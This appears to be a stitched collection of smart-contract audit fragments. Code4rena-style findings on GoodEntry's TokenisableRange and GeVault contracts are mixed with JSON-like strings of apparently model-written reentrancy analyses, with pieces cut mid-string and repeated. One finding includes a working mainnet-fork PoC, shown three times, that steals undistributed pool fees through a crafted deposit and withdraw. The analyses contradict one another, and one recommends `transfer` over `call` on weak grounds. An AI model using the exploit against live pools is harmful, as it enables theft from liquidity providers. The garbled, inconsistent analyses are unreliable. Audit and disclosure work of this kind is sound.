Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

                "decompose": "Answer: Yes, the given smart contract code is vulnerable to a reentrancy attack.\n\nType of vulnerability: Reentrancy vulnerability\n\nReason: The reason for this vulnerability is the lack of finalizing state changes before making external calls. In the `swapTokensForExactETH` function, the contract first calls `weth.withdraw(amountOut)` and then transfers Ether to the `msg.sender` using `payable(msg.sender).call{value: amountOut}(\"\")`. This sequence of operations provides an opportunity for a reentrancy attack.\n\nHere's a step-by-step analysis:\n\n1. The attacker calls the `swapTokensForExactETH` function with a malicious contract address as `to`.\n2. The contract first transfers the input tokens from the attacker's address to itself and then approves the Router contract to transfer the tokens.\n3. The contract calculates the exact output amount and updates the state with the `amounts` array.\n4. The contract calls `weth.withdraw(amountOut)` to get the Ether equivalent of the output tokens.\n5. The contract transfers the withdrawn Ether to the `msg.sender` (attacker's malicious contract) using `call{value: amountOut}(\"\")`.\n6. The attacker's contract now has control and can call the `swapTokensForExactETH` function again before the state change in step 3 is finalized, re-entering the original contract.\n7. This re-entrancy allows the attacker to manipulate the same tokens or funds more than once, leading to a double-send situation.\n\nTo mitigate this vulnerability, the contract should follow the Checks-Effects-Interactions pattern:\n\n1. Checks: Validate inputs and conditions before executing any interactions.\n2. Effects: Adjust the contract's state before the interaction.\n3. Interactions: Perform the external contract calls after the state changes.\n\nIn this case, the contract should finalize the state changes (updating the `amounts` array) before making the external call to transfer Ether. This ensures that even if a reentrancy occurs, it will operate on updated and accurate contract state, preventing the attacker from exploiting inconsistent state for malicious gain",
                "poc_patch": "Answer: Yes, the given smart contract code is vulnerable to a reentrancy attack.\n\nType of vulnerability: Reentrancy Vulnerability\n\nReason: The function `swapTokensForExactETH` calls an external contract (`weth.withdraw(amountOut)`) before updating the state to reflect that the action has occurred (`emit Swap` event). This creates a window during which a reentrancy attack can occur. An attacker could potentially manipulate the same tokens more than once by re-entering the function before the initial transaction is recorded.\n\nProof of Concept (PoC):\n\nHere's a simplified PoC to demonstrate the vulnerability:\n\n1. Attacker creates a malicious contract `ContractAttacker` that calls `swapTokensForExactETH` with a specified `amountOut`.\n2. In the `ContractAttacker`, after receiving the `amountOut`, it calls back into the `swapTokensForExactETH` function again before the initial transaction is recorded.\n3. The `swapTokensForExactETH` function, unaware of the reentrancy, sends more funds to the `ContractAttacker` during the same transaction.\n\nPseudocode for the PoC:\n\n```solidity\n// Attacker contract\ncontract ContractAttacker {\n   address payable owner;\n   IMyContract myContract;\n   \n   constructor(address payable _owner, address _myContract) {\n       owner = _owner;\n       myContract = IMyContract(_myContract);\n   }\n   \n   function attack(uint amountOut) public {\n       myContract.swapTokensForExactETH{value: amountOut}(amountOut, address(this), deadline);\n   }\n   \n   function () external payable {\n       // Send ether back to the owner\n       owner.transfer(msg.value);\n   }\n}\n\n// MyContract\ncontract MyContract {\n   function swapTokensForExactETH(uint amountOut, address payable to, uint deadline) external payable returns (uint[] memory amounts) {\n       // ...\n       IWETH9 weth = IWETH9(ROUTER.WETH9());\n       acceptPayable = true;\n       weth.withdraw(amountOut); // External call\n       accept",

The `withdraw` function is called on the `weth` contract, but this is not a reentrancy concern since it is not an untrusted contract. Additionally, the contract's state is updated (acceptPayable is set to true and then false) before the external call is made to send Ether back to the msg.sender.\n\nIn summary, the given smart contract function is not vulnerable to a reentrancy attack in the context of a loan mechanism and shows no signs of reentrancy vulnerabilities in its current form.",

Specifically, if the recipient contract is malicious, it could reenter the `swapTokensForExactETH` function by calling a fallback function or a specific function in the contract, which could lead to unintended behavior or security vulnerabilities.\n\nTo mitigate this risk, it is recommended to use the `transfer` function instead of `call` when sending Ether to untrusted contracts, or to implement a reentrancy guard that prevents the contract from being called again until the current execution frame is completed. For example, the contract could set a `callInProgress` state variable to true at the beginning of the function and set it back to false at the end, and check this variable before allowing any state changes or external calls.",

The smart contract function `swapTokensForExactETH` interacts with the Router contract (ROUTER) and WETH9 contract (WETH9) to swap tokens for ETH.\n2. The contract first transfers the input token (path[0]) from the sender's address to the contract (`ogInAsset.safeTransferFrom(msg.sender, address(this), amountInMax);`).\n3. Then, it approves the Router contract to spend the input token on behalf of the contract (`ogInAsset.safeApprove(address(ROUTER), amountInMax);`).\n4. After executing the swap through the Router contract, the contract revokes the token approval from the Router contract by setting the allowance to zero (`ogInAsset.safeApprove(address(ROUTER), 0);`).\n5. This revocation step ensures that the Router contract no longer has access to the input token after the swap is complete.\n6. The contract does not update any external contract references during this process, so the vulnerability regarding incorrect token approval handling when updating external contract references does not apply.\n\nIn summary, the smart contract code includes the necessary steps to revoke token approval from the Router contract after the swap is complete, and it does not update any external contract references, so it does not appear to be vulnerable to the specified vulnerability.",

However, it is still important to note that the contract correctly handles token approvals by first calling `ogInAsset.safeTransferFrom` to transfer tokens from the msg.sender to the contract, and then calling `ogInAsset.safeApprove` to approve the ROUTER to spend the tokens.\n\n3. At the end of the function, the contract revokes the token approval by calling `ogInAsset.safeApprove` again with an approval value of 0, which prevents any future undesired access to the tokens.\n\nSince the contract does not have the functionality to update the address of the external contract, the described vulnerability does not apply.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

The smart contract calculates the new liquidity provider shares using the `increaseLiquidity` function from the `INonfungiblePositionManager` interface, which is a part of Uniswap v3's NFT position management system.

This ensures that even if an attacker deposits a small amount, the calculation of the new liquidity provider shares is done proportionally, and other liquidity providers will not suffer from undesired outcomes such as rounding down their minted shares to zero.\n\nSince the smart contract uses the Uniswap v3's NFT position management system and calculates the new liquidity provider shares correctly, it is not vulnerable to the described attack vector.",

These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool. Yay! \n        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));\n        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));\n    }\n```\nIt is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:\n> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert\n\n## Tools Used\nCode review\n\n## Recommended Mitigation Steps\n- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool\n- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:\n```diff\n    // Stack too deep, so localising some variables for feeLiquidity calculations \n-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity\n-    if ( newFee0 == 0 && newFee1 == 0 ){\n+    {\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath",
